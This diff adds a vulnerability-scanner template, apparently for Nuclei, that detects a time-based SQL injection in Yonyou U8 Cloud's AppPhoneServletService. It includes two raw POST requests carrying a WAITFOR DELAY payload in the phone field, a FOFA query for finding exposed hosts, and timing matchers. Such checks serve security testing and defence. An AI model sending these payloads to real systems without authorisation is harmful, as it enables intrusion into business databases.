@@ -1,0 +1,44 @@
+id: poc-yaml-yongyou-u8-cloud-appphoneservletservice-sqli
+info:
+  name: "用友U8 Cloud AppPhoneServletService SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 用友U8 Cloud
+  metadata:
+    finger: "用友U8cloud"
+    fofa: "app=\"用友-U8-Cloud\""
+
+http:
+  - raw:
+      - |
+        POST /service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        accountCode: U8cloud
+
+        module=sm&method=getUserInfoByPhone&phone=1';WAITFOR+DELAY+'0:0:5'--+
+      - |
+        POST /service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        accountCode: U8cloud
+
+        module=sm&method=getUserInfoByPhone&phone=1';WAITFOR+DELAY+'0:0:8'--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":false'
+      - type: word
+        part: header
+        words:
+          - "text/json"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
